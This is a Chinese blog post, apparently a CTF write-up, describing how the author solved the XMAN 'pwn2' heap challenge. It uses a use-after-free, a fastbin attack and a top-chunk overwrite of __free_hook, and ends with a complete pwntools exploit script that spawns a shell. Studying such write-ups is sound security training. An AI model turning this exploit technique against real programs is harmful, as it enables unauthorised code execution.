---
title: Xman Pwn2
date: 2018-08-27 08:37:40
tags: [CTF, PWN]
categories: XMAN夏令营
---
## xman夏令营 pwn2
​	xman堆系列的最后一题，不得不说xman培训的pwn题质量是真的高，4道题，基本上涵盖了所有的堆利用方式。  
	<!--more-->
	这道题可以说还是很骚的，拿到题目先扔进ida看，看到地址是相对文件的偏移就知道开了pie，接着看函数，选单程序pwn多了，拿到题目先看4个函数，增删改查，一般先看增，看他的chunk list是如何存储的，或者有哪些其它的功能，这里就是一个很正常的分配堆快的功能，比较骚的地方是，他会检测用户的输入，一旦用户输入了libc段的地址，程序就会输出一个类似有黑客攻击的信息，然后把你创建的堆快内容全部清零，这样的话你就不能直接构造来写__malloc_hook和__free_hook了，而且程序本身又开了pie，不能写got表，无法得到text段加载地址，什么东西都无法写入，如何构造system去get shell，乍看之下此题竟然无解。  
	虽然一开始体验很不好，但是漏洞还是要找的，继续往下看，看完add去看dele，dele是最容易出问题的地方，大概看了一下就发现dele中没有将chunk list中已经delete过的置null，存在一个uaf(use after free)漏洞。然而有什么用呢？利用这个漏洞我们可以改写free chunk的metadata部分，最终达到一个任意地址写的效果，然而，如果要直接写__malloc_hook或者__free_hook的话还是不行，程序不允许输入libc段地址，那该如何去做。  
	一开始没有想出来，去看了下edit函数，是正常的edit，看了一下保护，发现居然没开canary，于是找程序看有没有可以fake chunk的地方，说不定可以通过泄露libc.environ然后在栈上构造fake chunk，最后用house_of_spirit完成利用。然而遗憾的是并没有发现程序有这样的功能可以在栈上构造fake chunk，而且栈上现有的chunk size无法满足fast bin的检查，很僵。  
	继续想，__malloc_hook和__free_hook还是要写的，不然根本无法完成利用，那如何写，程序不让你直接写，那能否间接写呢？emmmmm，发现可以利用top chunk attack，这个利用方式不涉及直接写libc，metadata也只是size，构造的话一般不会出现libc段的size。  
	那就利用top chunk attack来写__free_hook，首先需要泄露libc地址，这个用unsorted bin直接就可以泄露，接着有个小难点，如何写top chunk size，这里用的是fastbin attack写，毕竟fd指向chunk，而且检查相对unsortedd bin比较简单。构造两个fastbin大小的chunk，由于利用top chunk attack需要泄露top chunk的地址，所以先后free掉两个fastbin chunk，之后就可以leak heap地址了，然后计算下偏移得到top chunk的ptr；接着利用fastbin attack，在top chunk ptr-0x10的位置malloc chunk，这里要绕过size检查，恰好这个size就在前两个构造的fastbin chunk中，edit一下贴着top chunk的chunk，将最后8个字节改成一个稍大点size，同时满足和前两个chunk在同一个fastbin中，这里前两个chunk我分配的是0x60字节，那么这里的size需要是0x70(加上header部分)，这样就能malloc chunk了，之后改top chunk size，设修改的大小为为y，修改之后重新add的chunk大小为x，则想要写__free_got为system必须满足top_ptr+x=free_hook-0x10,y-x-0x10=system，很容易就能得到x为free_hook-top_ptr-0x10,y为system+free_hook-top_ptr,edit一下将free_hook改成system，之后可以在堆上创一个/bin/sh字符串，这样deleti一下就能getshell了。  
	不得不提的是这道题除了之前说的几个难点外还有几个坑点，比较重要的就是top chunk的pre_inuse位这里是为1的，很多人可能为了满足size的条件忽略了这个标志位，若这边p标志位为0的话其实是无法利用的(骚的一批)，所以这里的__free_hook最后其实是syltem+1,试了一下其它的包括y+2,一直到y+8都是可以get shel的(神奇的操作)。    
	还有就是有个tricks，__malloc_hook一般来说用one_gadget写，__free_hook直接用system写，不过这道题的one_gadget写__malloc__hook死活没有成功哈哈也是很僵硬。留下很多坑，以后再填吧。

exp如下：

```
from pwn import *
#context(log_level='debug',arch='amd64',os='linux')
p=process('./pwn2')
elf=ELF('./pwn2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p)
def add(size,x):
	p.recvuntil('choice >> ')
	p.sendline('1')
	p.recvuntil('Please enter the length of the note:\n')
	p.sendline(str(size))
	p.recvuntil('Please enter the data of the note:\n')
	p.sendline(x)

def dele(idx):
	p.recvuntil('choice >> ')
	p.sendline('3')
	p.recvuntil('Please enter the index of the note:\n')
	p.sendline(str(idx))
	
def edit(idx,x):
	p.recvuntil('choice >> ')
	p.sendline('2')
	p.recvuntil('Please enter the index of the note:\n')
	p.sendline(str(idx))
	p.recvuntil('Please enter the data of the note:\n')
	p.sendline(x)

def show():
	p.recvuntil('choice >> ')
	p.sendline('4')

add(0x80,0x80*'a')
add(0x80,0x80*'b')
dele(0)
show()
p.recvuntil('note index 0 : ')
main_arena_88=u64(p.recv(6).ljust(8,'\x00'))-0x58
libc_base=main_arena_88-libc.symbols['__malloc_hook']-0x10
log.info('libc_base > '+hex(libc_base))
one_gadget=0xf02a4+libc_base
one_gadget=0xf1147+libc_base
one_gadget=0x45216+libc_base
malloc_hook=libc.symbols['__malloc_hook']+libc_base
log.info('malloc_hook > '+hex(malloc_hook))
free_hook=libc.symbols['__free_hook']+libc_base
log.info('free_hook > '+hex(free_hook))
system_address=libc.symbols['system']+libc_base
#one_gadget=libc_base+0xf02a4
add(0x80,'0000')
add(0x60,'1'*0x60) #3
add(0x60,'2'*0x50+p64(0)+p64(0x71))
dele(4)
dele(3)
show()
p.recvuntil('note index 3 : ')
heap_address=u64(p.recv(6).ljust(8,'\x00'))-0x70-0x90-0x90
log.info('heap_address > '+hex(heap_address))
edit(4,p64(heap_address+0x90+0x90+0x70+0x60))
add(0x60,'/bin/sh')
add(0x60,'2222')
top_ptr=heap_address+0x90+0x90+0x70+0x70
log.info('top_ptr > '+hex(top_ptr))
#top_ptr+x==free_hook/malloc_hook
#x=free_hook/malloc_hook-top_ptr
#top_size=system=origin-apply
#so origin=system+apply=system+free_hook/malloc_hook-top_ptr
log.info('top_chunk_size > '+hex(system_address+free_hook-top_ptr-0x1))
#add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x1))
add(0x60,p64(0)+p64(system_address+free_hook-top_ptr-0x1))
add(free_hook-top_ptr-0x10,'\n')
dele(5)
'''
add(0x60,p64(0)+p64(one_gadget+free_hook-top_ptr-0x9))
add(free_hook-top_ptr-0x10,'\n')
dele(8)
'''
'''
add(0x60,p64(0)+p64(system_address+malloc_hook-top_ptr-0x1))
add(malloc_hook-top_ptr-0x10,'\n')
dele(3)
'''
p.interactive()

```

